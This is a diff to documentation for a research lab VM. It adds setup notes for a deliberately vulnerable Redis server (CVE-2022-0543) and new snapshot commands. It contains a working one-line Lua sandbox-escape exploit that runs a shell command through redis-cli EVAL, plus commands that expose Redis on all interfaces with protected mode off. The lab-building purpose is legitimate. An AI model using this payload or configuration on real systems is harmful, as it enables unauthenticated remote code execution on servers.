@@ -114,9 +114,33 @@ Hosted via Docker Compose in `~/research/log4j/`.
 - Target Port: 8080
 - Log Source: JSON-file driver via Docker logs.
 
+**Redis Lua Sandbox Escape (CVE-2022-0543)**
+Debian-specific vulnerability — Redis is dynamically linked against liblua5.1, allowing `package.loadlib()` to escape the Lua sandbox for unauthenticated RCE. CVSS 10.0.
+
+- Target Port: 6379
+- Installed via `apt install redis-server` (Debian 11 frozen repos ship vulnerable version)
+- Config: `bind 0.0.0.0`, `protected-mode no` in `/etc/redis/redis.conf`
+- Service managed by systemd: `systemctl restart redis-server`
+- Verify: `redis-cli -h 192.168.2.201 INFO server | grep redis_version`
+- Exploit test: `redis-cli EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0`
+
+Setup steps:
+```bash
+sudo apt install redis-server
+sudo apt-mark hold redis-server
+sudo sed -i 's/^bind 127.0.0.1/bind 0.0.0.0/' /etc/redis/redis.conf
+sudo sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf
+sudo systemctl restart redis-server
+sudo systemctl enable redis-server
+```
+
 ## 7. Snapshot Management
 
 The "Golden State" snapshot was created on Frodo immediately after provisioning:
 
 `virsh snapshot-create-as isildur --name "ISILDUR_READY_V1" --description "Base research state"`
+
+After adding Redis (CVE-2022-0543):
+
+`virsh snapshot-create-as isildur --name "ISILDUR_READY_V3" --description "Redis CVE-2022-0543 + BCC/eBPF"`
 
